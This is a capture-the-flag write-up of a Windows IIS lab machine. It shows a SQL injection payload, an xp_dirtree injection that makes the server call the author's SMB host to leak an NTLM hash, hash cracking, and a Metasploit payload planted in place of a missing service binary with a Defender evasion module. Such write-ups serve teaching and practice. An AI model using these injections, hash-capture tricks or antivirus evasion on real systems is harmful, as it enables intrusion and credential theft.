# PORT SCAN
* **80** &#8594; HTTP (IIS 10.0)
* **443** &#8594; HTTPS (IIS 10.0)
* **3389** &#8594; MS-Terminal-Service (RDP)
* **5985** &#8594; WinRM


<br><br><br>

# ENUMERATION & USER FLAG
This machne have a high score on `Real`, good to know! The port 80 is kinda nice but is just a different placeholder for the default IIS service

![4652582917215e29e17c61c0e29a8687.png](img/4652582917215e29e17c61c0e29a8687.png)

Same thing on the HTTPS but the `Common Name` value is pretty cool, a hint for the machine purpose

![a91bac713695e219f24a83610f5702ca.png](img/a91bac713695e219f24a83610f5702ca.png)

Well I run some dirbusting and subdomain discovery and the former found a `/remote` path on the HTTP service

![5996438b1750b638d9545905c0326b74.png](img/5996438b1750b638d9545905c0326b74.png)

I followd the little popup and use HTTPS instead and now we can investigate this interesting interface (note that now we know the Windows Server version, is written on the top)

![834a6356f4593d53d115833aaf7ac9f0.png](img/834a6356f4593d53d115833aaf7ac9f0.png)

[Here](https://powershellisfun.com/2023/09/14/using-windows-powershell-web-access/) I found a good description of what is **<u>Windows PowerShell Web Access</u>**

> Windows PowerShell® Web Access, first introduced in Windows Server® 2012, acts as a Windows PowerShell gateway, providing a web-based Windows PowerShell console that is targeted at a remote computer [...]

Clear this can turn really usefull for us but we need credentials and the Computer Name, pretty bad ah?
Another path was found, `/mvc`

![12673a56f22ecc71e5a610b1ea85765e.png](img/12673a56f22ecc71e5a610b1ea85765e.png)

We have a search feature, if we search for an empty strings the app return **504** items but the magic happens whenI try with the simplest check for SQL injections `' OR 1=1 ;--`

![7848cee50a26b2d3e2cbd504e06b6b0a.png](img/7848cee50a26b2d3e2cbd504e06b6b0a.png)

Gotch'a now we have a way in! Using SQLMAP I know the DBMS is MSSQL (even if seems obvious was worh to spend 2 seconds and be sure about it). I also removed the `--` strings at the end to cause an error page pop up which highlight the hidden gem: a username!

![e8f28f63f04be3645bc5bac8d7d1554f.png](img/e8f28f63f04be3645bc5bac8d7d1554f.png)

I was not able to extract something usefull but there is a thing that we can do and I have did in a different machine but not through a SQL injection, we can abuse `xp_dirtree` to get NTLM2 hash of the user

The endpoint that we can use to the injection is the `/mvc/Product.aspx?ProductSubCategoryId=[term_to_search]` if we inject something like `; EXEC master.sys.xp_dirtree '\\10.10.14.15\LOL' ;--` we should be able to list all the files on our self hosted SMB server

![68354b2749ff34f3ceea80771ea869be.png](img/68354b2749ff34f3ceea80771ea869be.png)

![32093c968d878ace7022a356280bc0a9.png](img/32093c968d878ace7022a356280bc0a9.png)

Good time to unleash the most powerfull cat out there, `hashcat`

![6cda58f0f0c2423e5d1a2a3cc3a25416.png](img/6cda58f0f0c2423e5d1a2a3cc3a25416.png)

Gotch'a, we can login through WinRM and grab the user flag

<br><br><br>

# PRIVILEGE ESCALATION

When login occurs we spawn in the `Documents` folder where inside we have a clue of the privilege escalation

![e0c05991d68142033b53ef99c0535e56.png](img/e0c05991d68142033b53ef99c0535e56.png)

Unifi video, cool. The machine has been created in 2018 so I will check for some known vulnerabilities from that year and down

![c2dcf716a3fe6634229f4aa40fe7c562.png](img/c2dcf716a3fe6634229f4aa40fe7c562.png)

We have something interesting here, first thing first we have the ability to append data inside the unifi directory

![07b762645145c20fbfb8e1a4e0828656.png](img/07b762645145c20fbfb8e1a4e0828656.png)

When the application start or stop execute the `taskkill.exe` file inside the directory where unifivideo is installed as root but that file doesn't exist so we can create it for it with **msfvenom** and copy that with SMB.
Sadly I am having some issues in the upload phase

![491f3c71c6c624d1b69d3bf3c8841e31.png](img/491f3c71c6c624d1b69d3bf3c8841e31.png)

With some research this is a common error when Windows Defender kicks in, I also tried with `wget` but the file is deleted after a second, cool we have to defeat the golem here!
I tried to use some encryption module on the payload creation like `XOR` and `Shikata ga nai` but nothing, I had some hopes on the latter but no way Defender is doing the job.

I have found a metasploit module which can help me to bypass defender, the [evasion/windows/windows_defender_exe](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/evasion/windows/windows_defender_exe.md). Maybe this is not a cool hacker way to solve this and let me look like a script kiddie but it does his job. Use a RC4 encryption and a costum compilier to hide from static analysis plus anti-emulation for dynamic analysis

![7d1959060c38f6fb8e617909a3872f1e.png](img/7d1959060c38f6fb8e617909a3872f1e.png)

Cool, I was able to upload and mantain the executable so at least for the  static analysis Defender is not able to classify the file as malicious. I can't be 100% sure it works until I try to trigger it so is time to start/stop/restart the service! Things like `Get-Process` are not permitted to use, we have too much low priv for that apparently so I need to enumerate directly the `Registry`.

One way to do this is to check the [Installer Properties](https://learn.microsoft.com/en-us/windows/win32/msi/uninstall-registry-key) with `cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`. With that we found the **Unifi Video** svc

![7508c5bbd2cf5ff8501d75cfaec9484f.png](img/7508c5bbd2cf5ff8501d75cfaec9484f.png)

Another way to enumerate that is through another registry tree, the one that store information about each service on the system: `HKLM:\system\currentcontrolset\services`. We can `cd` inside the registry and `ls`

![b1e6093e12e8c488674f7c605d0a5142.png](img/b1e6093e12e8c488674f7c605d0a5142.png)

We have the info we need now we can use `Start-Service "Ubiquiti UniFi Video"`, finger cross and we have the meterpeter session. The evasion module worked smoothly! 

![f2afff7c489fe82673788dcc2211ddbb.png](img/f2afff7c489fe82673788dcc2211ddbb.png)

<br><br>

> I have learned a lot here, the old trick with `xp_dirtree` is always there to save the day. Finally I get my hands dirty with some Evasion after I pwned the machine I look around for other HTB players solution and there is a lot involeved so I took my time to go through them looking new way to bypass the Golem. Cool Stuff!
